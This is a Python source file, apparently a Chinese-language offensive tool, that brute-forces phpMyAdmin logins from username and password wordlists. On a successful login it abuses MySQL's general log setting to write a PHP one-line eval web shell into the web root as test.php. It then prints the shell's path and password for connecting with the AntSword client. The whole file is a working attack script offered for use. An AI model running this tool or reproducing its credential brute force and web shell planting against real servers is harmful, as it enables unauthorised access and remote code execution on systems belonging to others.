import re
import sys
from argparse import ArgumentParser
import aiohttp
import aiofiles
import asyncio
import time
import multiprocessing
import json

# 使用IP域名时，需要设置cookie
jar = aiohttp.CookieJar(unsafe=True)
# 用户名密码队列
username_list = multiprocessing.Manager().list()
password_list = multiprocessing.Manager().list()


async def read_file(filename, queue):
    """处理文件到列表中"""
    async with aiofiles.open(filename, mode="r", encoding="utf-8") as f:
        while True:
            line = await f.readline()
            if not line:
                break
            else:
                line = line.strip("\n")
                queue.append(line)


async def handle_request(session, url, method, data=None, **kwargs):
    """处理请求"""
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
    }
    if method == "GET":
        try:
            async with session.get(url=url, headers=header) as response:
                text = await response.text()
                code = response.status
                return code, text
        except Exception as e:
            # print(str(e))
            return None, None
    elif method == "POST":
        try:
            async with session.post(url=url, headers=header, data=data, allow_redirects=False) as response:
                text = await response.text()
                code = response.status
                return code, text
        except Exception as e:
            # print(str(e))
            return None, None


async def phpmyadmin_crack(host, username, password, limit):
    """phpmyadmin密码爆破"""
    # 超时
    timeout = aiohttp.ClientTimeout(total=30)
    async with limit:
        async with aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True, ssl=False) as tc:
            async with aiohttp.ClientSession(connector=tc, timeout=timeout, cookie_jar=jar) as session:
                url = host + "/phpmyadmin/index.php"
                # 第一次请求获取token
                first_code, first_response = await handle_request(session=session, url=url, method="GET")
                if not first_response:
                    return False, False
                if first_code == 200:
                    # 获取token
                    token_search = re.compile(r'token=(.*?)"\s?target')
                    token = token_search.search(first_response)

                    if not token:
                        return False, False
                    else:
                        token_value = token.group(1)
                        login_url = host + "/phpmyadmin/index.php"
                        # print("爆破账号:{user},爆破密码:{password}".format(user=username, password=password))
                        # 第二次请求登录
                        login_data = {
                            "pma_username": username,
                            "pma_password": password,
                            "server": "1",
                            "lang": "zh_CN",
                            "token": token_value
                        }
                        second_code, second_response = await handle_request(session=session, url=login_url,
                                                                            method="POST",
                                                                            data=login_data)
                        if second_response is None:
                            return False, False
                        if second_code != 302:
                            return False, False
                        else:
                            # 首页
                            index_url = host + "/phpmyadmin/main.php?token={}".format(token_value)
                            index_code, index_response = await handle_request(session=session, url=index_url,
                                                                              method="GET")
                            if not index_response:
                                return False, False
                            if index_code == 200:
                                if "常规设置" in index_response:
                                    print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
                                    return True, token_value, session
                                else:
                                    return False, False
                            else:
                                return False, False


async def write_trojan(session, token_value, host):
    """写入木马"""
    sql_data = {
        "is_js_confirmed": 0,
        "token": token_value,
        "pos": 0,
        "goto": "server_sql.php",
        "message_to_show": "您的 SQL 语句已成功运行",
        "prev_sql_query": "",
        "sql_query": "",
        "sql_delimiter": ";",
        "show_query": 1,
        "ajax_request": "true"

    }
    # 设置日志开启
    sql_data.update(
        {
            "sql_query": "set global general_log='on';"
        }
    )
    sql_url = host + "/phpmyadmin/import.php"
    sql_log_on_code, sql_log_on_response = await handle_request(session=session, url=sql_url, method="POST",
                                                                data=sql_data)
    sql_log_on = json.loads(sql_log_on_response)
    if sql_log_on.get("success"):
        print("日志开关已打开")
    else:
        print("日志开关打开失败")
        return
    # 设置日志路径
    trojan_file = "test.php"
    path = "C:/phpStudy/WWW/{}".format(trojan_file)
    sql_data.update(
        {
            "sql_query": "set global general_log_file = '{}';".format(path)
        }
    )
    sql_log_path_code, sql_log_path_response = await handle_request(session=session, url=sql_url, method="POST",
                                                                    data=sql_data)
    sql_log_path = json.loads(sql_log_path_response)
    if sql_log_path.get("success"):
        print("日志路径设置成功")
    else:
        print("日志路径设置失败")
        return
    # 写入一句话木马
    sql_data.update(
        {
            "sql_query": """select '<?php eval($_POST["test"]);?>'"""
        }
    )
    print("开始写入一句话木马")
    trojan_code, trojan_response = await handle_request(session=session, url=sql_url, method="POST", data=sql_data)
    if trojan_response:
        if trojan_code == 200:
            print("一句话木马路径: {},密码test,请使用蚁剑连接".format(host + "/" + trojan_file))
            return True
    else:
        print("写入一句话木马失败")
        return
    # # 查询sql日志状态
    #     "sql_query": "show global variables like '%genera%';",
    # sql_state_response = handle_request(session=session, url=sql_state_url, method="POST", data=sql_state_data)
    # print(sql_state_response.text)


async def async_handle_user_pass():
    """处理用户名密码"""
    user_pass_tasks = [
        asyncio.create_task(read_file("Username.txt", username_list)),
        asyncio.create_task(read_file("Password.txt", password_list)),
    ]
    await asyncio.wait(user_pass_tasks)


def handle_user_pass():
    # 多线程中协程Loop标记
    # new_user_password_loop = asyncio.new_event_loop()
    # asyncio.set_event_loop(new_user_password_loop)
    user_password_loop = asyncio.get_event_loop()
    user_password_loop.run_until_complete(async_handle_user_pass())


async def async_handle_login_and_write_trojan(host, limit):
    for username in username_list:
        tasks = [asyncio.create_task(phpmyadmin_crack(host, username, password, limit)) for password in password_list]
        done, pending = await asyncio.wait(tasks)
        for i in done:
            login_return = i.result()
            if login_return[0]:
                # 写入一句话
                await write_trojan(login_return[2], login_return[1], host)


def handle_login_and_write_trojan(host, limit):
    # 多线程中协程Loop标记
    # new_login_loop = asyncio.new_event_loop()
    # asyncio.set_event_loop(new_login_loop)
    login_loop = asyncio.get_event_loop()
    login_loop.run_until_complete(async_handle_login_and_write_trojan(host, limit))


def main(host, limit):
    # 处理用户名密码文件
    up = multiprocessing.Process(target=handle_user_pass)
    up.start()
    up.join()
    login = multiprocessing.Process(target=handle_login_and_write_trojan, args=(host, limit,))
    login.start()
    login.join()


if __name__ == '__main__':
    parser = ArgumentParser(prog="W_BUGGY", usage="phpmyadmin爆破上传一句话", epilog="微信公众号：你丫才秃头")
    parser.add_argument("URL", help="探测的URL,如:http://www.test.com或http://192.168.1.1")
    parser.add_argument("-t", "--thread", type=int, dest="thread", help="线程数")
    args = parser.parse_args()

    url = sys.argv[1]

    max_worker = 1
    if args.thread:
        max_worker = args.thread
    # 并发限制
    semaphore = asyncio.Semaphore(max_worker)


    def handle_time():
        """处理时间"""
        timestamp = time.time()
        time_local = time.localtime(timestamp)
        time_format = time.strftime("%Y-%m-%d %H:%M:%S", time_local)
        return timestamp, time_format


    start_timestamp, start_time = handle_time()
    print("开始扫描时间{}".format(start_time))
    # 调用主方法
    main(host=url, limit=semaphore)
    end_timestamp, end_time = handle_time()
    print("扫描完成时间{}, 扫描耗时:{}分钟".format(end_time, int((end_timestamp - start_timestamp) / 60)))
